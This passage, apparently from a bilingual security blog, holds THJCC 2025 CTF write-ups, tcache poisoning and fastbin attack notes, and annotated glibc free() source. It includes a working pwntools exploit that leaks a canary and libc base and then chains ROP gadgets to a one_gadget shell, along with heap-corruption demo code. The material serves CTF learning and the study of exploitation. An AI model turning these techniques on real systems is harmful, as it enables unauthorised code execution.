one_gadget就可以RCE了\nWe can use new to exceed the size of collection[], allowing out-of-bounds (oob) read/write access (yes, it\u0026rsquo;s oob again).\nReading/writing on the stack naturally leads to the idea of crafting a ROP chain + one_gadget to achieve RCE.\nfrom pwn import * io = remote(\u0026#39;chal.ctf.scint.org\u0026#39;, 10006) # context.arch = \u0026#34;amd64\u0026#34; # context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] # gdb.attach(io) libc = ELF(\u0026#39;./libc.so.6\u0026#39;) for _ in range(7): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;); io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;2\u0026#39;); io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;3\u0026#39;) io.recvline() data = io.recvlines(8) data = [unpack(x[1:9], 64) for x in data]; canary = data[5] __libc_start_main_128 = data[7] libc_base = __libc_start_main_128 - libc.symbols[\u0026#39;__libc_start_main\u0026#39;] - 128 writable_buffer = libc_base - 0x500 print(f\u0026#34;libc base: {hex(libc_base)}\u0026#34;) print(f\u0026#34;canary: {hex(canary)}\u0026#34;) \u0026#39;\u0026#39;\u0026#39; 0xebc88 execve(\u0026#34;/bin/sh\u0026#34;, rsi, rdx) constraints: address rbp-0x78 is writable [rsi] == NULL || rsi == NULL || rsi is a valid argv [rdx] == NULL || rdx == NULL || rdx is a valid envp \u0026#39;\u0026#39;\u0026#39; \u0026#39;\u0026#39;\u0026#39; 0x00000000000904a9 : pop rdx ; pop rbx ; ret 0x000000000002be51 : pop rsi ; ret \u0026#39;\u0026#39;\u0026#39; pop_rdx_pop_rbx_ret = 0x00000000000904a9 + libc_base pop_rsi_ret = 0x000000000002be51 + libc_base one_gadget = 0xebc88 + libc_base paint_1 = [ b\u0026#39;a\u0026#39;*8, p64(canary), p64(writable_buffer), p64(pop_rdx_pop_rbx_ret), p64(0), p64(0), p64(pop_rsi_ret), p64(0), ] paint_2 = [ p64(one_gadget) ] + [p64(0)] * 7 io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;2\u0026#39;) io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;2\u0026#39;) io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;2\u0026#39;) io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) for l in paint_1: io.sendline(l) io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;2\u0026#39;) io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) for l in paint_2: io.sendline(l) io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;2\u0026#39;) io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;4\u0026#39;) io.interactive() Reverse #\r西 #\r複習一下gcc編譯器的過程\npreprocess -\u0026gt; compile -\u0026gt; assemble -\u0026gt; link\n其中，preprocess可以把#開頭的東西展開\n你可以用gcc -E來preprocess你的source code\nReview the compilation process of the GCC compiler:\npreprocess -\u0026gt; compile -\u0026gt; assemble -\u0026gt; link\nAmong these steps, the preprocess stage expands everything starting with #.\nYou can use gcc -E to preprocess your source code.\ngcc -E chal.c -o chal.s # 0 \u0026#34;chal.c\u0026#34; # 0 \u0026#34;\u0026lt;built-in\u0026gt;\u0026#34; # 0 \u0026#34;\u0026lt;command-line\u0026gt;\u0026#34; ...(skipped) # 539 \u0026#34;/usr/include/string.h\u0026#34; 3 4 # 4 \u0026#34;chal.c\u0026#34; 2 # 25 \u0026#34;chal.c\u0026#34; # 25 \u0026#34;chal.c\u0026#34; char enrypted_flag[] = \u0026#34;\\xa1\\xbd\\xbf\\xb6\\xb6\\x8e\\xa1\\x9d\\xc4\\x86\\xaa\\xc4\\xa6\\xaa\\x9b\\xc5\\xa1\\xaa\\x9a\\x97\\x93\\xa0\\xd1\\x96\\xb5\\xa1\\xc4\\xba\\x9b\\x88\u0026#34;; void decrypt(int n) { for (int i = 0; i \u0026lt; n; i ++) { enrypted_flag[i] ^= 0xF5; } } int main() { if (0) { decrypt(strlen(enrypted_flag)); } printf(\u0026#34;%s\u0026#34;, enrypted_flag); } 把0改成1即可\nSimply change 0 to 1.\nflag checker #\r這題如果不用AI打的話，應該有一點難度\nThis challenge would definitely be a bit difficult without AI\u0026rsquo;s assistance.\n把每個s[i]RORi個bit\nRotate each s[i] by i bits using a right rotation (ROR).\n他把陣列拆成20組，每組3個判斷式來判斷\n這邊可以簡單用聯立表達\nHe splits the array into 20 groups, with each group having 3 conditions for evaluation. This can be simply expressed using a system of equations.\n$$ \\left{ \\begin{aligned} S_{i} + S_{i + 1} = k_{i} \\ S_{i + 1} + S_{i + 2} = k_{i+1} \\ S_{i} + S_{i + 2} = k_{i+2} \\ \\end{aligned} \\right. $$\nsol #\r$$ 2(S_{i} + S_{i + 1} + S_{i + 2}) = k_{i} + k_{i+1} + k_{i+2} $$ $$ \\Rightarrow $$ $$ S_{i} = \\frac{k_{i} + k_{i+1} + k_{i+2}}{2} - (S_{i + 1} + S_{i + 2}) $$ $$ S_{i + 1} = \\frac{k_{i} + k_{i+1} + k_{i+2}}{2} - (S_{i} + S_{i + 2}) $$ $$ S_{i + 2} = \\frac{k_{i} + k_{i+1} + k_{i+2}}{2} - (S_{i} + S_{i + 1}) $$\ndata = [250, 197, 129, 80, 155, 117, 114, 109, 165, 181, 256, 209, 369, 449, 352, 315, 355, 418, 247, 359, 388, 341, 372, 289, 209, 141, 128, 385, 372, 477, 80, 0, 80] data_convert = [] for i in range(0, len(data), 3): ab, bc, ca = data[i], data[i + 1], data[i + 2] abc = (ab + bc + ca) // 2 data_convert.append(abc - bc) data_convert.append(abc - ca) data_convert.append(abc - ab) for i in range(len(data)): t = (8 - i) % 8 x = data_convert[i] ^ 0xf d = (((x \u0026lt;\u0026lt; (t \u0026amp; 7)) | (x \u0026gt;\u0026gt; (-t \u0026amp; 7))) \u0026amp; 0xff) print(chr(d), end=\u0026#34;\u0026#34;) noodle #\r首先expand這邊會把字串展開成bit\nFirst, the expand part will expand the string into bits. 然後swap bits\nThen, swap the bits. 最後壓縮起來\nFinally, compress it back.\nsol #\r因為是交換同byte裡面的bit，所以可以暴力搜尋\nSince the bits within the same byte are swapped, a brute force search can be used.\nimport string cipher = \u0026#34;2a48589898decafcaefa98087cfa58ae9e2afa1c1aaa2e96fa38061a9ca8fa182ebeee\u0026#34; cipher = bytes.fromhex(cipher) cnt = 0 alpha = string.printable enc_alpha = \u0026#34;0686169626a636b646c68c1c9c2cac3cbc4ccc5cdc6cec7cfc0e8e1e9e2eae3ebe4ece5e88189828a838b848c858d868e878f80a8a1a9a2aaa3aba4aca5a84149424a434b444c454d464e474f456d666e676f608da6aea7afa0cde6eee7e\u0026#34; dec = {a:b for a, b in zip(bytes.fromhex(enc_alpha), alpha)} print(\u0026#34;\u0026#34;.join(dec[ch] for ch in cipher)) sol2 #\r這個binary的encryption用的是involutory cipher，把密文丟回去就可以拿到明文了\nThis binary encryption uses an involutory cipher, meaning that by putting the ciphertext back, you can retrieve the plaintext.\nempty #\rsub_1060被改成rwx\n然後被和unk_4045xor\nsub_1060 has been changed to rwx and then XORed with unk_4045.\npwndbg\u0026gt; x/100i $pc =\u0026gt; 0x555555555060: endbr64 0x555555555064: push rbp 0x555555555065: mov rbp,rsp 0x555555555068: sub rsp,0x30 0x55555555506c: mov rax,QWORD PTR fs:0x28 0x555555555075: mov QWORD PTR [rbp-0x8],rax 0x555555555079: xor eax,eax 0x55555555507b: mov QWORD PTR [rbp-0x20],0x0 0x555555555083: mov QWORD PTR [rbp-0x18],0x0 0x55555555508b: mov BYTE PTR [rbp-0x10],0x0 0x55555555508f: lea rax,[rip+0xf6a] # 0x555555556000 0x555555555096: mov rdi,rax 0x555555555099: mov eax,0x0 0x55555555509e: call 0x555555555030 \u0026lt;printf@plt\u0026gt; 0x5555555550a3: lea rax,[rbp-0x20] 0x5555555550a7: mov rsi,rax 0x5555555550aa: lea rax,[rip+0xf5b] # 0x55555555600c 0x5555555550b1: mov rdi,rax 0x5555555550b4: mov eax,0x0 0x5555555550b9: call 0x555555555040 \u0026lt;__isoc99_scanf@plt\u0026gt; 0x5555555550be: mov DWORD PTR [rbp-0x28],0x0 0x5555555550c5: jmp 0x555555555107 0x5555555550c7: mov eax,DWORD PTR [rbp-0x28] 0x5555555550ca: cdqe 0x5555555550cc: movzx eax,BYTE PTR [rbp+rax*1-0x20] 0x5555555550d1: xor eax,0xffffffab 0x5555555550d4: mov ecx,eax 0x5555555550d6: mov eax,DWORD PTR [rbp-0x28] 0x5555555550d9: cdqe 0x5555555550db: lea rdx,[rip+0x2f1e] # 0x555555558000 0x5555555550e2: movzx eax,BYTE PTR [rax+rdx*1] 0x5555555550e6: cmp cl,al 0x5555555550e8: je 0x555555555103 0x5555555550ea: lea rax,[rip+0xf20] # 0x555555556011 0x5555555550f1: mov rdi,rax 0x5555555550f4: call 0x555555555010 \u0026lt;puts@plt\u0026gt; 0x5555555550f9: mov edi,0x0 0x5555555550fe: call 0x555555555050 \u0026lt;exit@plt\u0026gt; 0x555555555103: add DWORD PTR [rbp-0x28],0x1 0x555555555107: cmp DWORD PTR [rbp-0x28],0xf 0x55555555510b: jle 0x5555555550c7 0x55555555510d: lea rax,[rip+0xf04] # 0x555555556018 0x555555555114: mov rdi,rax 0x555555555117: call 0x555555555010 \u0026lt;puts@plt\u0026gt; 0x55555555511c: mov DWORD PTR [rbp-0x24],0x0 0x555555555123: jmp 0x55555555515f 0x555555555125: mov eax,DWORD PTR [rbp-0x24] 0x555555555128: cdqe 0x55555555512a: lea rdx,[rip+0x2eef] # 0x555555558020 0x555555555131: movzx ecx,BYTE PTR [rax+rdx*1] 0x555555555135: mov eax,DWORD PTR [rbp-0x24] 0x555555555138: cdq 0x555555555139: shr edx,0x1c 0x55555555513c: add eax,edx 0x55555555513e: and eax,0xf 0x555555555141: sub eax,edx 0x555555555143: cdqe 0x555555555145: movzx eax,BYTE PTR [rbp+rax*1-0x20] 0x55555555514a: xor ecx,eax 0x55555555514c: mov eax,DWORD PTR [rbp-0x24] 0x55555555514f: cdqe 0x555555555151: lea rdx,[rip+0x2ec8] # 0x555555558020 0x555555555158: mov BYTE PTR [rax+rdx*1],cl 0x55555555515b: add DWORD PTR [rbp-0x24],0x1 0x55555555515f: mov eax,DWORD PTR [rbp-0x24] 0x555555555162: cmp eax,0x24 0x555555555165: jbe 0x555555555125 0x555555555167: lea rax,[rip+0x2eb2] # 0x555555558020 0x55555555516e: mov rsi,rax 0x555555555171: lea rax,[rip+0xea9] # 0x555555556021 0x555555555178: mov rdi,rax 0x55555555517b: mov eax,0x0 0x555555555180: call 0x555555555030 \u0026lt;printf@plt\u0026gt; 0x555555555185: mov eax,0x0 0x55555555518a: mov rdx,QWORD PTR [rbp-0x8] 0x55555555518e: sub rdx,QWORD PTR fs:0x28 0x555555555197: je 0x55555555519e 0x555555555199: call 0x555555555020 \u0026lt;__stack_chk_fail@plt\u0026gt; 0x55555555519e: leave 0x55555555519f: ret 讀一下asm很快就能得到password了\nReading the assembly code will quickly reveal the password.\ndemon summoning #\r先照著檔案開啟的步驟擺放檔案\nFollow the steps from the file to place the files accordingly.\n這邊回傳了一個strcmp\n我們希望lpBuffer == Str2\nThis returns a strcmp function.\nWe want lpBuffer == Str2.\nMelon_Bun這個檔案的內容要是Satania's favorite\nThe content of the Melon_Bun file should be Satania's favorite.\n應該可以預期招喚成功\nIt should be expected that the summoning will succeed. ","date":"2025-04-21","externalUrl":null,"permalink":"/posts/thjcc-2025/","section":"Posts","summary":"Crypto #\rSNAKE #\r把拆開來看大概經過了下面的步驟","title":"THJCC 2025 題解","type":"posts"},{"content":" 版本 latest 效果 可以構造一個allocated chunk在任意writable address上 先malloc兩個以上的tcache #\runsigned long int *ptr0, *ptr1; int target; ptr0 = malloc(0x10); ptr1 = malloc(0x10); target = 0xdead; printf(\u0026#34;chunk 1: %p\\n\u0026#34;, ptr0); printf(\u0026#34;chunk 2: %p\\n\u0026#34;, ptr1); printf(\u0026#34;int: %p\\n\\n\u0026#34;, \u0026amp;target); output\nchunk 1: 0x26122260 chunk 2: 0x26122280 int: 0x7ffc6c21674 free #\rfree(ptr0); //tcache -\u0026gt; Chunk0 free(ptr1); //tcache -\u0026gt; Chunk1 -\u0026gt; Chunk0 竄改fd成target #\r*ptr1 = (unsigned long long)\u0026amp;target; //tcache -\u0026gt; target malloc #\r這時候應該能看到malloc了一塊heap到stack上了\nunsigned long int *ptr2, *ptr3; ptr2 = malloc(0x10); ptr3 = malloc(0x10); printf(\u0026#34;Chunk 3: %p contains: %lx\\n\u0026#34;, ptr2, *ptr2); //chunk1, tcache -\u0026gt; target printf(\u0026#34;Chunk 4: %p contains: %lx\\n\u0026#34;, ptr3, *ptr3); //chunk0, tcache -\u0026gt; null Chunk 3: 0x26122280 contains: 7ffc6c216740 Chunk 4: 0x7ffc6c216740 contains: dead ","date":"2025-04-09","externalUrl":null,"permalink":"/notes/pwn/heap/10-tcache-poision/","section":"Notes","summary":"版本 latest 效果 可以構造一個allocated chunk在任意writable address上 先malloc兩個以上的tcache #\runsigned long int *ptr0, *ptr1; int target; ptr0 = malloc(0x10); ptr1 = malloc(0x10); target = 0xdead; printf(\u0026#34;chunk 1: %p\\n\u0026#34;, ptr0); printf(\u0026#34;chunk 2: %p\\n\u0026#34;, ptr1); printf(\u0026#34;int: %p\\n\\n\u0026#34;, \u0026amp;target); output","title":"Bin","type":"notes"},{"content":" 版本 latest 效果 可以構造一個allocated chunk在任意writable address上 glibc 2.23 #\rmalloc #\r先malloc出fastbin\n然後現在創了一個stackVar，用於存fake size和target\nunsigned long *ptr0, *ptr1, *ptr2; ptr0 = malloc(0x30); ptr1 = malloc(0x30); ptr2 = malloc(0x30); printf(\u0026#34;Chunk 0: %p\\n\u0026#34;, ptr0); printf(\u0026#34;Chunk 1: %p\\n\u0026#34;, ptr1); printf(\u0026#34;Chunk 2: %p\\n\\n\u0026#34;, ptr2); unsigned long long stackVar[2]; stackVar[0] = 0x20; // fake size stackVar[1] = 0x55; // target char *data0 = \u0026#34;00000000\u0026#34;; char *data1 = \u0026#34;11111111\u0026#34;; char *data2 = \u0026#34;22222222\u0026#34;; memcpy(ptr0, data0, 0x8); memcpy(ptr1, data1, 0x8); memcpy(ptr2, data2, 0x8); free #\rfree(ptr0); //fastbin-\u0026gt;Chunk0 free(ptr1); //fastbin-\u0026gt;Chunk1-\u0026gt;Chunk0 free(ptr2); //fastbin-\u0026gt;Chunk2-\u0026gt;Chunk1-\u0026gt;Chunk0 printf(\u0026#34;Chunk0 @ %p\\t contains: %lx\\n\u0026#34;, ptr0, *ptr0); printf(\u0026#34;Chunk1 @ %p\\t contains: %lx\\n\u0026#34;, ptr1, *ptr1); printf(\u0026#34;Chunk2 @ %p\\t contains: %lx\\n\\n\u0026#34;, ptr2, *ptr2); output\nChunk0 @ 0x2e80010 contains: 0 Chunk1 @ 0x2e80030 contains: 2e80000 Chunk2 @ 0x2e80050 contains: 2e80020 fastbin會造著下圖方式串接(*我為了方便起見只用兩個chunk做示範)\n竄改chunk fd #\r假設我們現在可以uaf一個chunk，freed chuck指標的位置會剛好存放fd\n可以直接把他修改到target - 0x10\n*ptr1 = (unsigned long)((char *)\u0026amp;stackVar - 8); //overwirte the FP: fastbin-\u0026gt;Chunk2-\u0026gt;Chunk1-\u0026gt;stackVar malloc #\r最後malloc相同size的chunk\n結果應該會成功把chunk allocate到target上\nunsigned long *ptr3, *ptr4, *ptr5; ptr3 = malloc(8); //fastbin-\u0026gt;Chunk1-\u0026gt;stackVar ptr4 = malloc(8); //fastbin-\u0026gt;stackVar ptr5 = malloc(8); //fastbin-\u0026gt;NULL printf(\u0026#34;Chunk 3: %p\\n\u0026#34;, ptr3); printf(\u0026#34;Chunk 4: %p\\n\u0026#34;, ptr4); printf(\u0026#34;Chunk 5: %p\\t Contains: 0x%x\\n\u0026#34;, ptr5, (int)*ptr5); output\nChunk 3: 0x2e80050 Chunk 4: 0x2e80030 Chunk 5: 0x7fff8910f668 Contains: 0x55 glibc 2.27 以上 #\r先填滿tcache在進行剛剛操作\n","date":"2025-04-09","externalUrl":null,"permalink":"/notes/pwn/heap/9-fastbin-attack/","section":"Notes","summary":"版本 latest 效果 可以構造一個allocated chunk在任意writable address上 glibc 2.","title":"Bin","type":"notes"},{"content":"","date":"2025-04-09","externalUrl":null,"permalink":"/series/heap-exploitation/","section":"Series","summary":"","title":"Heap Exploitation","type":"series"},{"content":"","date":"2025-04-09","externalUrl":null,"permalink":"/notes/","section":"Notes","summary":"","title":"Notes","type":"notes"},{"content":"","date":"2025-04-09","externalUrl":null,"permalink":"/notes/pwn/","section":"Notes","summary":"","title":"Pwn","type":"notes"},{"content":"","date":"2025-04-09","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"\r__libc_free() #\r其實就是free() __libc_free(void *mem) { mstate ar_ptr; mchunkptr p; /* chunk corresponding to mem */ if (mem == 0) /* free(0) has no effect */ return; /* Quickly check that the freed pointer matches the tag for the memory. This gives a useful double-free detection. */ if (__glibc_unlikely(mtag_enabled)) // 檢查freed pointer是 *(volatile char *)mem; int err = errno; p = mem2chunk(mem); 檢查是否用mmap出來的chunk #\rif (chunk_is_mmapped(p)) /* release mmapped memory. */ { /* See if the dynamic brk/mmap threshold needs adjusting. Dumped fake mmapped chunks do not affect the threshold. */ if (!mp_.no_dyn_threshold \u0026amp;\u0026amp; chunksize_nomask(p) \u0026gt; mp_.mmap_threshold \u0026amp;\u0026amp; chunksize_nomask(p) \u0026lt;= DEFAULT_MMAP_THRESHOLD_MAX) { mp_.mmap_threshold = chunksize(p); mp_.trim_threshold = 2 * mp_.mmap_threshold; LIBC_PROBE(memory_mallopt_free_dyn_thresholds, 2, mp_.mmap_threshold, mp_.trim_threshold); } munmap_chunk(p); // mmap 出來的東西要用munmap釋放 } else { MAYBE_INIT_TCACHE(); // 初始化tcache(如果還沒) /* Mark the chunk as belonging to the library again. */ (void)tag_region(chunk2mem(p), memsize(p)); ar_ptr = arena_for_chunk(p); _int_free(ar_ptr, p, 0); } __set_errno(err); } _int_free() #\r實際在執行free的函數 _int_free(mstate av, mchunkptr p, int have_lock) { INTERNAL_SIZE_T size; /* its size */ mfastbinptr *fb; /* associated fastbin */ mchunkptr nextchunk; /* next contiguous chunk */ INTERNAL_SIZE_T nextsize; /* its size */ int nextinuse; /* true if nextchunk is used */ INTERNAL_SIZE_T prevsize; /* size of previous contiguous chunk */ mchunkptr bck; /* misc temp for linking */ mchunkptr fwd; /* misc temp for linking */ size = chunksize(p); /* Little security check which won\u0026#39;t hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by \u0026#34;design\u0026#34; from some intruder. */ // 檢查指針的有效性，包含大小和對齊 if (__builtin_expect((uintptr_t)p \u0026gt; (uintptr_t)-size, 0) || __builtin_expect(misaligned_chunk(p), 0)) malloc_printerr(\u0026#34;free(): invalid pointer\u0026#34;); /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */ // 檢查大小的有效性(是否對齊) if (__glibc_unlikely(size \u0026lt; MINSIZE || !aligned_OK(size))) malloc_printerr(\u0026#34;free(): invalid size\u0026#34;); check_inuse_chunk(av, p); tcache #\r#if USE_TCACHE { size_t tc_idx = csize2tidx(size); if (tcache != NULL \u0026amp;\u0026amp; tc_idx \u0026lt; mp_.tcache_bins) // tcache有空間且被初始化 { /* Check to see if it\u0026#39;s already in the tcache. */ tcache_entry *e = (tcache_entry *)chunk2mem(p); /* This test succeeds on double free. However, we don\u0026#39;t 100% trust it (it also matches random payload data at a 1 in 2^\u0026lt;size_t\u0026gt; chance), so verify it\u0026#39;s not an unlikely coincidence before aborting. */ if (__glibc_unlikely(e-\u0026gt;key == tcache_key)) { tcache_entry *tmp; size_t cnt = 0; LIBC_PROBE(memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache-\u0026gt;entries[tc_idx]; tmp; tmp = REVEAL_PTR(tmp-\u0026gt;next), ++cnt) { if (cnt \u0026gt;= mp_.tcache_count) malloc_printerr(\u0026#34;free(): too many chunks detected in tcache\u0026#34;); // tcache 太多chunk if (__glibc_unlikely(!aligned_OK(tmp))) malloc_printerr(\u0026#34;free(): unaligned chunk detected in tcache 2\u0026#34;); // tcache 未對齊 if (tmp == e) malloc_printerr(\u0026#34;free(): double free detected in tcache 2\u0026#34;); // tcache 裡面已經有這個chunk了 (double free) /* If we get here, it was a coincidence. We\u0026#39;ve wasted a few cycles, but don\u0026#39;t abort. */ } } if (tcache-\u0026gt;counts[tc_idx] \u0026lt; mp_.tcache_count) { tcache_put(p, tc_idx); // 放入tcache return; } } } #endif if ((unsigned long)(size) \u0026lt;= (unsigned long)(get_max_fast()) #if TRIM_FASTBINS /* If TRIM_FASTBINS set, don\u0026#39;t place chunks bordering top into fastbins */ \u0026amp;\u0026amp; (chunk_at_offset(p, size) != av-\u0026gt;top) // 如果下一個chunk是 top chunk 的話不要放進fastbin #endif ) { if (__builtin_expect(chunksize_nomask(chunk_at_offset(p, size)) \u0026lt;= CHUNK_HDR_SZ, 0) || __builtin_expect(chunksize(chunk_at_offset(p, size)) \u0026gt;= av-\u0026gt;system_mem, 0)) { bool fail = true; /* We might not have a lock at this point and concurrent modifications of system_mem might result in a false positive. Redo the test after getting the lock. */ if (!have_lock) { __libc_lock_lock(av-\u0026gt;mutex); fail = (chunksize_nomask(chunk_at_offset(p, size)) \u0026lt;= CHUNK_HDR_SZ || chunksize(chunk_at_offset(p, size)) \u0026gt;= av-\u0026gt;system_mem); __libc_lock_unlock(av-\u0026gt;mutex); } if (fail) // 檢查下一個chunk的大小 malloc_printerr(\u0026#34;free(): invalid next size (fast)\u0026#34;); } free_perturb(chunk2mem(p), size - CHUNK_HDR_SZ); atomic_store_relaxed(\u0026amp;av-\u0026gt;have_fastchunks, true);// 因為要存入fastbin unsigned int idx = fastbin_index(size); fb = \u0026amp;fastbin(av, idx); // 找fastbin對應大小的起始點 /* Atomically link P to its fastbin: P-\u0026gt;FD = *FB; *FB = P; */ mchunkptr old = *fb, old2; if (SINGLE_THREAD_P) { /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect(old == p, 0)) // 檢查fastbin top不是現在正在free的chunk的chunk malloc_printerr(\u0026#34;double free or corruption (fasttop)\u0026#34;); p-\u0026gt;fd = PROTECT_PTR(\u0026amp;p-\u0026gt;fd, old); *fb = p; } else do { /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect(old == p, 0)) malloc_printerr(\u0026#34;double free or corruption (fasttop)\u0026#34;); old2 = old; p-\u0026gt;fd = PROTECT_PTR(\u0026amp;p-\u0026gt;fd, old); //safe linking } while ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2); /* Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding. We can dereference OLD only if we have the lock, otherwise it might have already been allocated again. */ if (have_lock \u0026amp;\u0026amp; old != NULL \u0026amp;\u0026amp; __builtin_expect(fastbin_index(chunksize(old)) != idx, 0)) malloc_printerr(\u0026#34;invalid fastbin entry (free)\u0026#34;); } unsortedbin #\r會檢查目前目前chunk附近的chunk，避免heap結構被破壞 // 如果chunk不是被mmap出來的 else if (!chunk_is_mmapped(p)) { /* If we\u0026#39;re single-threaded, don\u0026#39;t lock the arena. */ if (SINGLE_THREAD_P) have_lock = true; if (!have_lock) __libc_lock_lock(av-\u0026gt;mutex); nextchunk = chunk_at_offset(p, size); /* Lightweight tests: check whether the block is already the top block. */ if (__glibc_unlikely(p == av-\u0026gt;top)) // 如果已經在top chunk裡面 malloc_printerr(\u0026#34;double free or corruption (top)\u0026#34;); /* Or whether the next chunk is beyond the boundaries of the arena. */ if (__builtin_expect(contiguous(av) \u0026amp;\u0026amp; (char *)nextchunk \u0026gt;= ((char *)av-\u0026gt;top + chunksize(av-\u0026gt;top)), 0)) // nextchunk不能超越arena的邊界 malloc_printerr(\u0026#34;double free or corruption (out)\u0026#34;); /* Or whether the block is actually not marked used. */ if (__glibc_unlikely(!prev_inuse(nextchunk))) // 如果nextchunk 的 prev_inuse 已經被unset malloc_printerr(\u0026#34;double free or corruption (!prev)\u0026#34;); nextsize = chunksize(nextchunk); if (__builtin_expect(chunksize_nomask(nextchunk) \u0026lt;= CHUNK_HDR_SZ, 0) || __builtin_expect(nextsize \u0026gt;= av-\u0026gt;system_mem, 0)) // chunk size 不正常 malloc_printerr(\u0026#34;free(): invalid next size (normal)\u0026#34;); free_perturb(chunk2mem(p), size - CHUNK_HDR_SZ); 合併 or 標記為freed chunk #\r這裡執行會檢查前後的chunk是不是freed chunk，如果不是的話就會嘗試合併 在請求大chunk的時候為了減少碎片劃，可能會觸發fastbin consolidation /* consolidate backward */ if (!prev_inuse(p)) // 向後合併 { prevsize = prev_size(p); size += prevsize; p = chunk_at_offset(p, -((long)prevsize)); if (__glibc_unlikely(chunksize(p) != prevsize)) malloc_printerr(\u0026#34;corrupted size vs. prev_size while consolidating\u0026#34;); unlink_chunk(av, p); } if (nextchunk != av-\u0026gt;top) { /* get and clear inuse bit */ nextinuse = inuse_bit_at_offset(nextchunk, nextsize); // unset下一個chunk的prev_inuse bit /* consolidate forward */ if (!nextinuse) // 向前合併 { unlink_chunk(av, nextchunk); size += nextsize; } else clear_inuse_bit_at_offset(nextchunk, 0); // unset nextchunk inuse bit /* Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc. */ // 標記為freed chunk bck = unsorted_chunks(av); fwd = bck-\u0026gt;fd; if (__glibc_unlikely(fwd-\u0026gt;bk != bck)) malloc_printerr(\u0026#34;free(): corrupted unsorted chunks\u0026#34;); p-\u0026gt;fd = fwd; // unlink操作 p-\u0026gt;bk = bck; if (!in_smallbin_range(size)) { p-\u0026gt;fd_nextsize = NULL; p-\u0026gt;bk_nextsize = NULL; } bck-\u0026gt;fd = p; fwd-\u0026gt;bk = p; set_head(p, size | PREV_INUSE); // 設定freed chunk set_foot(p, size); check_free_chunk(av, p); } /* If the chunk borders the current high end of memory, consolidate into top */ else // 向top chunk合併 { size += nextsize; set_head(p, size | PREV_INUSE); av-\u0026gt;top = p; check_chunk(av, p); } 修剪 chunk #\r/* If freeing a large space, consolidate possibly-surrounding chunks. Then, if the total unused topmost memory exceeds trim threshold, ask malloc_trim to reduce top. Unless max_fast is 0, we don\u0026#39;t know if there are fastbins bordering top, so we cannot tell for sure whether threshold has been reached unless fastbins are consolidated. But we don\u0026#39;t want to consolidate on each free. As a compromise, consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD is reached. */ // 如果要free的大小大於FASTBIN_CONSOLIDATION_THRESHOLD(觸發fastbin合併的臨界點) if ((unsigned long)(size) \u0026gt;= FASTBIN_CONSOLIDATION_THRESHOLD) { if (atomic_load_relaxed(\u0026amp;av-\u0026gt;have_fastchunks)) malloc_consolidate(av); //如果有fastchunks就合併 if (av == \u0026amp;main_arena) { #ifndef MORECORE_CANNOT_TRIM if ((unsigned long)(chunksize(av-\u0026gt;top)) \u0026gt;= (unsigned long)(mp_.trim_threshold)) systrim(mp_.top_pad, av); // top chunk收縮，但不會把記憶體還給系統 #endif } else { // 非主分配區直接歸還 /* Always try heap_trim(), even if the top chunk is not large, because the corresponding heap might go away. */ heap_info *heap = heap_for_ptr(top(av)); assert(heap-\u0026gt;ar_ptr == av); heap_trim(heap, mp_.top_pad); } } if (!have_lock) __libc_lock_unlock(av-\u0026gt;mutex); } /* If the chunk was allocated via mmap, release via munmap(). */ munmap #\r/* If the chunk was allocated via mmap, release via munmap(). */ else // mmap出來的，munmap { munmap_chunk(p); } } malloc_consolidate() #\r這個函數主要用來合併fastbin的 static void malloc_consolidate(mstate av) { mfastbinptr *fb; /* current fastbin being consolidated */ mfastbinptr *maxfb; /* last fastbin (for loop control) */ mchunkptr p; /* current chunk being consolidated */ mchunkptr nextp; /* next chunk to consolidate */ mchunkptr unsorted_bin; /* bin header */ mchunkptr first_unsorted; /* chunk to link to */ /* These have same use as in free() */ mchunkptr nextchunk; INTERNAL_SIZE_T size; INTERNAL_SIZE_T nextsize; INTERNAL_SIZE_T prevsize; int nextinuse; atomic_store_relaxed(\u0026amp;av-\u0026gt;have_fastchunks, false); // 清空fastbin標記 unsorted_bin = unsorted_chunks(av); /* Remove each chunk from fast bin and consolidate it, placing it then in unsorted bin. Among other reasons for doing this, placing in unsorted bin avoids needing to calculate actual bins until malloc is sure that chunks aren\u0026#39;t immediately going to be reused anyway. */ // 按照fd順序依序合併每個chunk 開始遍歷 + 檢查 #\rmaxfb = \u0026amp;fastbin(av, NFASTBINS - 1); // 總共幾個fastbin鏈 fb = \u0026amp;fastbin(av, 0); do // 以bin為單位遍歷 { p = atomic_exchange_acq(fb, NULL); if (p != 0) // 以chunk為單位變歷 { do { { if (__glibc_unlikely(misaligned_chunk(p))) // 檢查是否隊齊 malloc_printerr(\u0026#34;malloc_consolidate(): unaligned fastbin chunk detected\u0026#34;); unsigned int idx = fastbin_index(chunksize(p)); if ((\u0026amp;fastbin(av, idx)) != fb) // 檢查大小是否正確 malloc_printerr(\u0026#34;malloc_consolidate(): invalid chunk size\u0026#34;); } check_inuse_chunk(av, 